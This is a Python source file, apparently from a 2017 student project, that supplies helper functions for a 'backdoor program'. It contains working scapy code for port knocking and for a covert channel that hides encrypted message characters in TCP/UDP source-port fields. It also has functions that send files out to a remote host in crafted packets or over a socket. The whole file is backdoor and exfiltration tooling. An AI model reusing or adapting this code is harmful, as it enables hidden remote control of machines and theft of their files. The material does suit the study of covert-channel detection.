#!/usr/bin/env python
#  =================================================================
#  	SOURCE FILE: helpers.py
#  
#
#	DATE: Dec 4th 2017
#  
#  
#  	AUTHOR: Paul Cabanez, Justin Chau
#
#	
#	DESCRIPTION: supplies helper functions to client and backdoor program
#		
#	
#
#	LAST REVISED: Nov 22th 2017
#  =================================================================

import binascii, time, os, ntpath, encryption, logging, configReader
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

maxPort = 65535


#  ===================================================================
#  name: portKnock
#			
#  @param ip - the IP you want to send the knocks to
#  @param destport - the port you want to send the knocks to
#
#  @return none
#		
#  ====================================================================
def portKnock(ip,destport):
	print configReader.portknockArray
	for knock in configReader.portknockArray:
		if configReader.protocol == 'tcp':
			packet = IP(dst=ip)/TCP(sport=int(knock),dport=destport)
		elif configReader.protocol == 'udp':
			packet = IP(dst=ip)/UDP(sport=int(knock), dport=destport)
		send(packet)
		time.sleep(1)

#  ===================================================================
#  Name: chunkString 
#			
#  @param size - the size of the chunk 
#  @param string - the string you want to split
#
#  @return chunkedString - a string that is chunked into pieces
#	
#  Description - splits string into chunks of length
#
#  ====================================================================
def chunkString(size, string):
	chunkedString = [string[i:i+size] for i in range(0, len(string),size)]
	return chunkedString
	
#  ===================================================================
#  name: createPacketTwo 
#			
#  @param protocol - the size of the chunk 
#  @param ip - the string you want to split
#  @param char1 - first character of the chunked string
#  @param char2 - second character of the chunked string
#  @param port - the port you want to send to
#
#  @return packet - contains two ascii characters in binary form
#
#  ====================================================================
def createPacketTwo(protocol, ip, char1, char2, port):
	binChar1 = bin(ord(char1))[2:].zfill(8)
	binChar2 = bin(ord(char2))[2:].zfill(8)
	
	intPortVal = int(binChar1 + binChar2, 2) #get the integer value of the concatenated binary values
	
	#packet crafting
	if protocol == 'tcp':
		packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
	elif protocol == 'udp':
		packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
	
	return packet
	
#  ===================================================================
#  name: createPacketTwo 
#			
#  @param protocol - the size of the chunk 
#  @param ip - the string you want to split
#  @param char1 - first character of the chunked string with 1 character
#  @param port - the port you want to send to
#
#  @return packet - contains two ascii characters in binary form
#
#  description: 
#  ====================================================================
def createPacketOne(protocol, ip , char, port):
	binChar = bin(ord(char))[2:].zfill(8)
	
	intPortVal = int(binChar, 2) #get the integer value of binary value
	
	#packet crafting
	if protocol == 'tcp':
		packet = IP(dst=ip)/TCP(dport=port, sport=maxPort - intPortVal)
	elif protocol == 'udp':
		packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
		
	return packet


#  ===================================================================
#  name: parsePacket
#			
#  @param packet - packet that needs to be parsed for the characters in them
#
#  @return - a character that came from the packet could be two or one
#
#  description: parses the information of the packet
#  ====================================================================	
def parsePacket(packet):
	sport = packet.sport
	difference = maxPort - sport
	binVal = bin(difference)[2:]
	binLen = len(binVal)
	
	if binLen > 8:
		binChar2 = binVal[-8:]
		binChar1 = binVal[0:binLen - 8]
		char1 = chr(int(binChar1,2))
		char2 = chr(int(binChar2,2))
		
		return str(char1 + char2)
		
	else:
		char = chr(int(binVal, 2))
		return str(char)

#  ===================================================================
#  name: sendMessage
#			
#  @param message 	- message that needs to be sent to ip
#  @param ip		- ip of the client program
#  @param port 		- port of the client program
#
#  @return none
#
#  description: sends message with craft packet of bits of characters
#  ====================================================================
def sendMessage(message,  ip, port):
	encryptedData = encryption.encryption(message)
	encryptedData = chunkString(2, encryptedData)
				
	lastIndex = len(encryptedData) - 1
				
	time.sleep(1)
	
	for index, chunk in enumerate(encryptedData):
		if len(chunk) == 2:
			pairs = list(chunk)
			packet = createPacketTwo(configReader.protocol, ip, pairs[0], pairs[1], port)

		elif len(chunk) == 1:
			packet = createPacketOne(configReader.protocol, ip, chunk, port)

		
		if index == lastIndex:
			packet = packet/Raw(load=configReader.password)
		
		send(packet, verbose=0)
		time.sleep(0.1)
		
#  ===================================================================
#  name: sendFile
#			
#  @param filePath 	- filePath of the file
#  @param ip		- ip of the client program
#  @param port 		- port of the client program
#
#  @return none
#
#  ====================================================================	
def sendFile(ip, filePath, port):
	fileDescriptor = open(filePath, 'rb')
	header = ntpath.basename(filePath) + '\0'
	data = header + fileDescriptor.read()
	
	if configReader.protocol == "tcp":
		packet = IP(dst=configReader.srcIP)/ TCP(dport=port)/ Raw(load=encryption.encryption(data))
	elif configReader.protocol == "udp":
		packet = IP(dst=configReader.srcIP)/ UDP(dport=port)/ Raw(load=encryption.encryption(data))
	
	portKnock(ip,port)
	
	time.sleep(1)
	
	packet = packet/Raw(load=configReader.password)
	send(packet, verbose=0)
	
	print "Sent a packet"
	time.sleep(1)
	
def fileSender(ip, filePath, port):
	
	portKnock(ip,port) #port knock to let the client know a socket is open
	print 'Server listening....'
	
	port = 60000                    # Reserve a port for your service.
	s = socket.socket()             # Create a socket object
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	host = socket.gethostname()     # Get local machine name
	s.bind((host, port))            # Bind to the port
	s.listen(5)                     # Now wait for client connection.
	sending = True

	while sending:
		conn, addr = s.accept()     # Establish connection with client.
		print 'Got connection from', addr
		data = conn.recv(1024)
		print('Server received', repr(data))
	
		filename=filePath
		f = open(filename,'rb')
		l = f.read(1024)
		while (l):
			conn.send(l)
			print('Sent ',repr(l))
			l = f.read(1024)
		
		f.close()
			
		print('Done sending')
		conn.send('Thank you for connecting')
		conn.close()
		sending = False
	
	


	
